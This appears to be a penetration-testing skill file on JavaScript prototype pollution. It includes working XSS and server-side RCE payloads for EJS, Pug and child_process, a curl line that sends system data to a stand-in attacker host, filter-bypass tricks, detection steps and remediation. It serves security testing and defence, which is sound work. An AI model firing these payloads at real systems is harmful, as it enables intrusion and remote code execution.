---
name: prototype-pollution
description: Prototype Pollution testing covering __proto__ and constructor.prototype injection with client-side DOM XSS and server-side RCE techniques
mitre_techniques: [T1190, T1059.007]
kill_chain_phases: [initial_access, execution]
---

# Prototype Pollution

Prototype Pollution is a JavaScript-specific vulnerability where an attacker modifies `Object.prototype`, injecting properties that propagate to all objects in the application. On the client side, this leads to DOM XSS through gadgets that read polluted properties. On the server side (Node.js), it escalates to remote code execution through polluted options in child process spawning, template engines, and module loading.

## Attack Surface

**Types**
- Client-side: DOM XSS via polluted properties consumed by frontend libraries or application code
- Server-side: RCE via polluted options in Node.js APIs (`child_process`, `ejs`, `pug`, `handlebars`)
- Denial of service: polluted properties causing crashes, type errors, or infinite loops

**Contexts**
- JSON body parsing, query string parsing, deep merge/clone utilities, object spread with user-controlled keys, GraphQL input objects, configuration merging

**Injection Vectors**
- `__proto__` property in JSON: `{"__proto__": {"polluted": true}}`
- `constructor.prototype`: `{"constructor": {"prototype": {"polluted": true}}}`
- Dot-notation path traversal: `a.b.__proto__.c` in libraries accepting path strings

**Frameworks/Libraries**
- Lodash (`merge`, `defaultsDeep`, `set`, `zipObjectDeep`), jQuery (`extend` deep), Hoek (`merge`), Express (query parser), Fastify, minimist, yargs-parser

**Defenses to Bypass**
- `__proto__` key filtering (use `constructor.prototype` instead), JSON schema validation, Object.freeze on prototypes

## Key Vulnerabilities

### Client-Side Prototype Pollution

**Via URL Parameters (common in SPAs):**
```
https://target.com/?__proto__[polluted]=true
https://target.com/?__proto__.polluted=true
https://target.com/?constructor[prototype][polluted]=true
```

**Via JSON Input:**
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

**Via Deep Merge:**
```javascript
// Vulnerable merge function
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

// Exploitation
merge({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
console.log({}.polluted); // "yes"
```

### Client-Side Gadgets (Pollution to XSS)

Gadgets are existing code paths that read properties from objects and use them in dangerous sinks:

**innerHTML gadget:**
```javascript
// Application code
let config = {};
// ... config is populated from defaults
element.innerHTML = config.template || '<div>default</div>';

// Attack: pollute Object.prototype.template
// ?__proto__[template]=<img src=x onerror=alert(1)>
```

**script src gadget:**
```javascript
// Library creates script elements
let opts = {};
let script = document.createElement('script');
script.src = opts.cdnUrl + '/lib.js';  // cdnUrl read from prototype

// Attack: ?__proto__[cdnUrl]=https://attacker.com/evil
```

**jQuery html gadget:**
```javascript
// If $.extend deep-merges user input
$.extend(true, {}, userInput);
// Then any jQuery code reading object properties may hit polluted values
```

### Server-Side RCE

**child_process.spawn/exec via shell option:**
```javascript
// Node.js internals check options.shell
// If Object.prototype.shell is polluted:
{"__proto__": {"shell": true}}

// Then child_process.spawn uses shell execution
// Combined with env pollution:
{"__proto__": {"shell": "/proc/self/exe", "env": {"NODE_OPTIONS": "--require /proc/self/environ"}}}
```

**child_process.fork/execSync via NODE_OPTIONS:**
```json
{"__proto__": {"execPath": "/bin/sh", "execArgv": ["-c", "curl attacker.com/$(whoami)"]}}
```

**EJS Template Engine RCE:**
```json
{
  "__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"
  }
}
```

**Pug Template Engine RCE:**
```json
{
  "__proto__": {
    "block": {
      "type": "Text",
      "val": "x]});process.mainModule.require('child_process').execSync('id');//"
    }
  }
}
```

**Handlebars Template RCE:**
```json
{
  "__proto__": {
    "allowProtoMethodsByDefault": true,
    "allowProtoPropertiesByDefault": true
  }
}
```

## Detection Techniques

### Manual Testing

**Browser Console (client-side):**
```javascript
// Check if prototype is already polluted
console.log({}.polluted);  // should be undefined

// Test pollution via URL
// Navigate to: https://target.com/?__proto__[testPollution]=pwned
// Then in console:
console.log({}.testPollution);  // "pwned" if vulnerable
```

**Server-Side (via API):**
```bash
# Send pollution payload in JSON body
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "yes"}}'

# Test if pollution persists in subsequent responses
curl https://target.com/api/status
# Look for "polluted" property in response objects

# Test constructor.prototype path
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"polluted": "yes"}}}'
```

### Automated Detection

**Property injection test:**
```javascript
// Inject a unique property and check if it appears on new objects
const testProp = '__test_' + Math.random().toString(36).slice(2);
// Send: {"__proto__": {"[testProp]": "detected"}}
// Then check if clean objects have the property
```

## Vulnerable Libraries (Known CVEs)

- **Lodash** < 4.17.12: `merge`, `defaultsDeep`, `zipObjectDeep`
- **jQuery** < 3.4.0: `$.extend(true, ...)` with `__proto__`
- **Hoek** < 5.0.3: `merge`
- **minimist** < 1.2.6: argument parsing with `--__proto__.x=y`
- **yargs-parser** < 13.1.2: similar to minimist
- **express** query parser: `qs` library parses `?__proto__[x]=y` into nested objects
- **Handlebars** < 4.6.0: template compilation with polluted prototype

## Bypass Techniques

- **constructor.prototype** when `__proto__` is filtered: `{"constructor":{"prototype":{"key":"val"}}}`
- **Nested path strings**: `set(obj, 'constructor.prototype.key', 'val')` in libraries accepting paths
- **Array index confusion**: `{"0": {"__proto__": {"key": "val"}}}` through recursive merge
- **Unicode/encoding**: `_\_proto\_\_` with Unicode underscores that normalize

## Testing Methodology

1. **Identify merge/clone operations** — look for deep merge, deep clone, object spread, or path-based set operations on user input
2. **Test `__proto__` injection** — send payloads via JSON body, query parameters, and path strings
3. **Test `constructor.prototype`** — alternative path when `__proto__` is filtered
4. **Verify pollution** — check if new empty objects inherit the injected property
5. **Find gadgets (client)** — identify code reading properties from objects that could reach dangerous sinks (innerHTML, src, href, eval)
6. **Find gadgets (server)** — identify code paths where polluted properties affect child_process, template rendering, or module loading
7. **Chain to impact** — demonstrate XSS (client) or RCE (server) through identified gadgets

## Indicators of Vulnerability

- Injected property via `__proto__` appears on freshly created objects (`{}.injectedProp` returns the value)
- Application behavior changes after sending a pollution payload (different template rendering, modified options)
- Error messages referencing unexpected properties or type mismatches from polluted prototype
- Known vulnerable library versions in `package.json` or `node_modules`

## Remediation

- Use `Object.create(null)` for dictionary-like objects (no prototype chain)
- Freeze the prototype: `Object.freeze(Object.prototype)` (may break some libraries)
- Filter dangerous keys: reject `__proto__`, `constructor`, `prototype` in user input before merge/clone
- Use `Map` instead of plain objects for user-controlled key-value data
- Update libraries: Lodash >= 4.17.21, jQuery >= 3.4.0, minimist >= 1.2.6
- Use `--disable-proto=throw` Node.js flag (v12.17+) to throw on `__proto__` access
- Validate input schema strictly; reject unknown properties
- For template engines, avoid passing user-controlled objects directly as render options

## Summary

Prototype Pollution abuses JavaScript's prototype chain to inject properties into all objects. The key to exploitation is finding gadgets: code paths that read polluted properties and feed them to dangerous sinks. On the client side this yields XSS; on the server side it yields RCE through Node.js APIs and template engines. Filter `__proto__` and `constructor.prototype` paths at input boundaries and use prototype-less objects for untrusted data.
